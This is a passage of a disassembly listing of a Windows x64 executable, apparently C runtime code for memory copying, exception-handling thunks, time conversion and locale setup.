   14000334f:	90                   	nop
   140003350:	49 83 f8 20          	cmp    $0x20,%r8
   140003354:	77 17                	ja     0x14000336d
   140003356:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000335a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140003361:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140003365:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000336c:	c3                   	ret
   14000336d:	48 3b d1             	cmp    %rcx,%rdx
   140003370:	73 0e                	jae    0x140003380
   140003372:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140003376:	49 3b c9             	cmp    %r9,%rcx
   140003379:	0f 82 41 04 00 00    	jb     0x1400037c0
   14000337f:	90                   	nop
   140003380:	83 3d 91 3c 01 00 03 	cmpl   $0x3,0x13c91(%rip)        # 0x140017018
   140003387:	0f 82 e3 02 00 00    	jb     0x140003670
   14000338d:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   140003394:	76 16                	jbe    0x1400033ac
   140003396:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000339d:	77 0d                	ja     0x1400033ac
   14000339f:	f6 05 ce 4c 01 00 02 	testb  $0x2,0x14cce(%rip)        # 0x140018074
   1400033a6:	0f 85 64 fe ff ff    	jne    0x140003210
   1400033ac:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   1400033b0:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   1400033b7:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400033be:	0f 86 c4 00 00 00    	jbe    0x140003488
   1400033c4:	4c 8b c9             	mov    %rcx,%r9
   1400033c7:	49 83 e1 1f          	and    $0x1f,%r9
   1400033cb:	49 83 e9 20          	sub    $0x20,%r9
   1400033cf:	49 2b c9             	sub    %r9,%rcx
   1400033d2:	49 2b d1             	sub    %r9,%rdx
   1400033d5:	4d 03 c1             	add    %r9,%r8
   1400033d8:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400033df:	0f 86 a3 00 00 00    	jbe    0x140003488
   1400033e5:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   1400033ec:	0f 87 3e 01 00 00    	ja     0x140003530
   1400033f2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400033f9:	1f 84 00 00 00 00 00 
   140003400:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140003404:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140003409:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000340e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140003413:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   140003417:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000341c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   140003421:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   140003426:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000342d:	00 
   14000342e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140003435:	00 
   140003436:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000343d:	00 
   14000343e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140003445:	00 
   140003446:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000344d:	00 
   14000344e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   140003455:	00 
   140003456:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000345d:	00 
   14000345e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   140003465:	00 
   140003466:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000346d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140003474:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000347b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140003482:	0f 83 78 ff ff ff    	jae    0x140003400
   140003488:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000348c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140003490:	4d 8b d9             	mov    %r9,%r11
   140003493:	49 c1 eb 05          	shr    $0x5,%r11
   140003497:	47 8b 9c 9a f0 a0 01 	mov    0x1a0f0(%r10,%r11,4),%r11d
   14000349e:	00 
   14000349f:	4d 03 da             	add    %r10,%r11
   1400034a2:	41 ff e3             	jmp    *%r11
   1400034a5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   1400034ac:	ff ff ff 
   1400034af:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   1400034b6:	ff ff ff 
   1400034b9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400034c0:	ff ff ff 
   1400034c3:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   1400034ca:	ff ff ff 
   1400034cd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   1400034d4:	ff ff ff 
   1400034d7:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   1400034de:	ff ff ff 
   1400034e1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   1400034e8:	ff ff ff 
   1400034eb:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   1400034f2:	ff ff ff 
   1400034f5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400034fc:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   140003503:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000350a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   140003511:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140003518:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000351f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140003526:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000352a:	c5 f8 77             	vzeroupper
   14000352d:	c3                   	ret
   14000352e:	66 90                	xchg   %ax,%ax
   140003530:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140003534:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140003539:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000353e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140003543:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   140003547:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000354c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   140003551:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   140003556:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000355d:	00 
   14000355e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140003565:	00 
   140003566:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000356d:	00 
   14000356e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140003575:	00 
   140003576:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000357d:	00 
   14000357e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   140003585:	00 
   140003586:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000358d:	00 
   14000358e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   140003595:	00 
   140003596:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000359d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   1400035a4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   1400035ab:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400035b2:	0f 83 78 ff ff ff    	jae    0x140003530
   1400035b8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   1400035bc:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   1400035c0:	4d 8b d9             	mov    %r9,%r11
   1400035c3:	49 c1 eb 05          	shr    $0x5,%r11
   1400035c7:	47 8b 9c 9a 14 a1 01 	mov    0x1a114(%r10,%r11,4),%r11d
   1400035ce:	00 
   1400035cf:	4d 03 da             	add    %r10,%r11
   1400035d2:	41 ff e3             	jmp    *%r11
   1400035d5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   1400035dc:	ff ff ff 
   1400035df:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   1400035e6:	ff ff ff 
   1400035e9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400035f0:	ff ff ff 
   1400035f3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   1400035fa:	ff ff ff 
   1400035fd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140003604:	ff ff ff 
   140003607:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000360e:	ff ff ff 
   140003611:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140003618:	ff ff ff 
   14000361b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   140003622:	ff ff ff 
   140003625:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000362c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   140003633:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000363a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   140003641:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140003648:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   14000364f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140003656:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000365a:	0f ae f8             	sfence
   14000365d:	c5 f8 77             	vzeroupper
   140003660:	c3                   	ret
   140003661:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140003668:	0f 1f 84 00 00 00 00 
   14000366f:	00 
   140003670:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   140003677:	76 0d                	jbe    0x140003686
   140003679:	f6 05 f4 49 01 00 02 	testb  $0x2,0x149f4(%rip)        # 0x140018074
   140003680:	0f 85 8a fb ff ff    	jne    0x140003210
   140003686:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000368a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   140003691:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140003698:	0f 86 8e 00 00 00    	jbe    0x14000372c
   14000369e:	4c 8b c9             	mov    %rcx,%r9
   1400036a1:	49 83 e1 0f          	and    $0xf,%r9
   1400036a5:	49 83 e9 10          	sub    $0x10,%r9
   1400036a9:	49 2b c9             	sub    %r9,%rcx
   1400036ac:	49 2b d1             	sub    %r9,%rdx
   1400036af:	4d 03 c1             	add    %r9,%r8
   1400036b2:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400036b9:	76 71                	jbe    0x14000372c
   1400036bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400036c0:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   1400036c4:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   1400036c9:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   1400036ce:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   1400036d3:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   1400036d7:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   1400036dc:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   1400036e1:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   1400036e6:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   1400036eb:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   1400036f0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   1400036f5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   1400036fa:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   1400036ff:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   140003704:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   140003709:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000370e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140003715:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000371c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140003723:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000372a:	73 94                	jae    0x1400036c0
   14000372c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140003730:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140003734:	4d 8b d9             	mov    %r9,%r11
   140003737:	49 c1 eb 04          	shr    $0x4,%r11
   14000373b:	47 8b 9c 9a 38 a1 01 	mov    0x1a138(%r10,%r11,4),%r11d
   140003742:	00 
   140003743:	4d 03 da             	add    %r10,%r11
   140003746:	41 ff e3             	jmp    *%r11
   140003749:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   140003750:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   140003757:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000375e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   140003765:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000376c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   140003773:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000377a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   140003781:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   140003788:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000378f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   140003796:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000379d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   1400037a4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   1400037ab:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   1400037b2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   1400037b6:	c3                   	ret
   1400037b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037be:	00 00 
   1400037c0:	4c 8b d9             	mov    %rcx,%r11
   1400037c3:	4c 8b d2             	mov    %rdx,%r10
   1400037c6:	48 2b d1             	sub    %rcx,%rdx
   1400037c9:	49 03 c8             	add    %r8,%rcx
   1400037cc:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   1400037d1:	48 83 e9 10          	sub    $0x10,%rcx
   1400037d5:	49 83 e8 10          	sub    $0x10,%r8
   1400037d9:	f6 c1 0f             	test   $0xf,%cl
   1400037dc:	74 17                	je     0x1400037f5
   1400037de:	48 8b c1             	mov    %rcx,%rax
   1400037e1:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400037e5:	0f 10 c8             	movups %xmm0,%xmm1
   1400037e8:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   1400037ec:	0f 11 08             	movups %xmm1,(%rax)
   1400037ef:	4c 8b c1             	mov    %rcx,%r8
   1400037f2:	4d 2b c3             	sub    %r11,%r8
   1400037f5:	4d 8b c8             	mov    %r8,%r9
   1400037f8:	49 c1 e9 07          	shr    $0x7,%r9
   1400037fc:	74 6f                	je     0x14000386d
   1400037fe:	0f 29 01             	movaps %xmm0,(%rcx)
   140003801:	eb 14                	jmp    0x140003817
   140003803:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000380a:	84 00 00 00 00 00 
   140003810:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140003814:	0f 29 09             	movaps %xmm1,(%rcx)
   140003817:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000381c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   140003821:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140003828:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000382c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140003830:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   140003835:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000383a:	49 ff c9             	dec    %r9
   14000383d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   140003841:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   140003845:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000384a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000384f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140003853:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140003857:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000385c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140003860:	75 ae                	jne    0x140003810
   140003862:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140003866:	49 83 e0 7f          	and    $0x7f,%r8
   14000386a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000386d:	4d 8b c8             	mov    %r8,%r9
   140003870:	49 c1 e9 04          	shr    $0x4,%r9
   140003874:	74 1a                	je     0x140003890
   140003876:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000387d:	00 00 00 
   140003880:	0f 11 01             	movups %xmm0,(%rcx)
   140003883:	48 83 e9 10          	sub    $0x10,%rcx
   140003887:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000388b:	49 ff c9             	dec    %r9
   14000388e:	75 f0                	jne    0x140003880
   140003890:	49 83 e0 0f          	and    $0xf,%r8
   140003894:	74 08                	je     0x14000389e
   140003896:	41 0f 10 0a          	movups (%r10),%xmm1
   14000389a:	41 0f 11 0b          	movups %xmm1,(%r11)
   14000389e:	0f 11 01             	movups %xmm0,(%rcx)
   1400038a1:	49 8b c3             	mov    %r11,%rax
   1400038a4:	c3                   	ret
   1400038a5:	cc                   	int3
   1400038a6:	cc                   	int3
   1400038a7:	cc                   	int3
   1400038a8:	cc                   	int3
   1400038a9:	cc                   	int3
   1400038aa:	cc                   	int3
   1400038ab:	cc                   	int3
   1400038ac:	cc                   	int3
   1400038ad:	cc                   	int3
   1400038ae:	cc                   	int3
   1400038af:	cc                   	int3
   1400038b0:	cc                   	int3
   1400038b1:	cc                   	int3
   1400038b2:	cc                   	int3
   1400038b3:	cc                   	int3
   1400038b4:	cc                   	int3
   1400038b5:	cc                   	int3
   1400038b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400038bd:	00 00 00 
   1400038c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400038c4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400038c9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400038ce:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   1400038d3:	48 8b 12             	mov    (%rdx),%rdx
   1400038d6:	48 8b c1             	mov    %rcx,%rax
   1400038d9:	e8 e2 f3 ff ff       	call   0x140002cc0
   1400038de:	ff d0                	call   *%rax
   1400038e0:	e8 0b f4 ff ff       	call   0x140002cf0
   1400038e5:	48 8b c8             	mov    %rax,%rcx
   1400038e8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400038ed:	48 8b 12             	mov    (%rdx),%rdx
   1400038f0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400038f6:	e8 c5 f3 ff ff       	call   0x140002cc0
   1400038fb:	48 83 c4 28          	add    $0x28,%rsp
   1400038ff:	c3                   	ret
   140003900:	cc                   	int3
   140003901:	cc                   	int3
   140003902:	cc                   	int3
   140003903:	cc                   	int3
   140003904:	cc                   	int3
   140003905:	cc                   	int3
   140003906:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000390d:	00 00 00 
   140003910:	48 83 ec 28          	sub    $0x28,%rsp
   140003914:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003919:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000391e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140003923:	48 8b 12             	mov    (%rdx),%rdx
   140003926:	48 8b c1             	mov    %rcx,%rax
   140003929:	e8 92 f3 ff ff       	call   0x140002cc0
   14000392e:	ff d0                	call   *%rax
   140003930:	e8 bb f3 ff ff       	call   0x140002cf0
   140003935:	48 83 c4 28          	add    $0x28,%rsp
   140003939:	c3                   	ret
   14000393a:	cc                   	int3
   14000393b:	cc                   	int3
   14000393c:	cc                   	int3
   14000393d:	cc                   	int3
   14000393e:	cc                   	int3
   14000393f:	cc                   	int3
   140003940:	48 83 ec 28          	sub    $0x28,%rsp
   140003944:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003949:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000394e:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003953:	48 8b 12             	mov    (%rdx),%rdx
   140003956:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000395c:	e8 5f f3 ff ff       	call   0x140002cc0
   140003961:	48 83 c4 28          	add    $0x28,%rsp
   140003965:	c3                   	ret
   140003966:	cc                   	int3
   140003967:	cc                   	int3
   140003968:	cc                   	int3
   140003969:	cc                   	int3
   14000396a:	cc                   	int3
   14000396b:	cc                   	int3
   14000396c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003970:	48 83 ec 28          	sub    $0x28,%rsp
   140003974:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003979:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000397e:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140003983:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   140003988:	45 8b c1             	mov    %r9d,%r8d
   14000398b:	48 8b c1             	mov    %rcx,%rax
   14000398e:	e8 2d f3 ff ff       	call   0x140002cc0
   140003993:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003998:	ff d0                	call   *%rax
   14000399a:	e8 51 f3 ff ff       	call   0x140002cf0
   14000399f:	48 8b c8             	mov    %rax,%rcx
   1400039a2:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400039a7:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400039ad:	e8 0e f3 ff ff       	call   0x140002cc0
   1400039b2:	48 83 c4 28          	add    $0x28,%rsp
   1400039b6:	c3                   	ret
   1400039b7:	cc                   	int3
   1400039b8:	40 53                	rex push %rbx
   1400039ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400039be:	8b d9                	mov    %ecx,%ebx
   1400039c0:	e8 ef 19 00 00       	call   0x1400053b4
   1400039c5:	89 58 28             	mov    %ebx,0x28(%rax)
   1400039c8:	48 83 c4 20          	add    $0x20,%rsp
   1400039cc:	5b                   	pop    %rbx
   1400039cd:	c3                   	ret
   1400039ce:	cc                   	int3
   1400039cf:	cc                   	int3
   1400039d0:	40 53                	rex push %rbx
   1400039d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400039d6:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400039dc:	48 8b d9             	mov    %rcx,%rbx
   1400039df:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400039e4:	ff 15 26 97 00 00    	call   *0x9726(%rip)        # 0x14000d110
   1400039ea:	48 b9 00 80 c1 2a 21 	movabs $0xfe624e212ac18000,%rcx
   1400039f1:	4e 62 fe 
   1400039f4:	48 b8 00 80 47 dd 78 	movabs $0x483f078dd478000,%rax
   1400039fb:	f0 83 04 
   1400039fe:	48 03 4c 24 30       	add    0x30(%rsp),%rcx
   140003a03:	48 3b c8             	cmp    %rax,%rcx
   140003a06:	7d 20                	jge    0x140003a28
   140003a08:	48 b8 bd 42 7a e5 d5 	movabs $0xd6bf94d5e57a42bd,%rax
   140003a0f:	94 bf d6 
   140003a12:	48 f7 e9             	imul   %rcx
   140003a15:	48 03 d1             	add    %rcx,%rdx
   140003a18:	48 c1 fa 17          	sar    $0x17,%rdx
   140003a1c:	48 8b c2             	mov    %rdx,%rax
   140003a1f:	48 c1 e8 3f          	shr    $0x3f,%rax
   140003a23:	48 03 d0             	add    %rax,%rdx
   140003a26:	eb 04                	jmp    0x140003a2c
   140003a28:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003a2c:	48 85 db             	test   %rbx,%rbx
   140003a2f:	74 03                	je     0x140003a34
   140003a31:	48 89 13             	mov    %rdx,(%rbx)
   140003a34:	48 8b c2             	mov    %rdx,%rax
   140003a37:	48 83 c4 20          	add    $0x20,%rsp
   140003a3b:	5b                   	pop    %rbx
   140003a3c:	c3                   	ret
   140003a3d:	cc                   	int3
   140003a3e:	cc                   	int3
   140003a3f:	cc                   	int3
   140003a40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003a45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003a4a:	57                   	push   %rdi
   140003a4b:	48 83 ec 20          	sub    $0x20,%rsp
   140003a4f:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140003a53:	48 8b f9             	mov    %rcx,%rdi
   140003a56:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140003a5a:	48 85 d2             	test   %rdx,%rdx
   140003a5d:	74 05                	je     0x140003a64
   140003a5f:	0f 10 02             	movups (%rdx),%xmm0
   140003a62:	eb 10                	jmp    0x140003a74
   140003a64:	83 3d d1 48 01 00 00 	cmpl   $0x0,0x148d1(%rip)        # 0x14001833c
   140003a6b:	75 0d                	jne    0x140003a7a
   140003a6d:	0f 10 05 44 37 01 00 	movups 0x13744(%rip),%xmm0        # 0x1400171b8
   140003a74:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140003a78:	eb 4e                	jmp    0x140003ac8
   140003a7a:	e8 35 19 00 00       	call   0x1400053b4
   140003a7f:	48 89 07             	mov    %rax,(%rdi)
   140003a82:	48 8b d6             	mov    %rsi,%rdx
   140003a85:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140003a8c:	48 89 0e             	mov    %rcx,(%rsi)
   140003a8f:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140003a96:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140003a9a:	48 8b c8             	mov    %rax,%rcx
   140003a9d:	e8 a6 24 00 00       	call   0x140005f48
   140003aa2:	48 8b 0f             	mov    (%rdi),%rcx
   140003aa5:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003aa9:	e8 ce 24 00 00       	call   0x140005f7c
   140003aae:	48 8b 0f             	mov    (%rdi),%rcx
   140003ab1:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140003ab7:	a8 02                	test   $0x2,%al
   140003ab9:	75 0d                	jne    0x140003ac8
   140003abb:	83 c8 02             	or     $0x2,%eax
   140003abe:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140003ac4:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140003ac8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
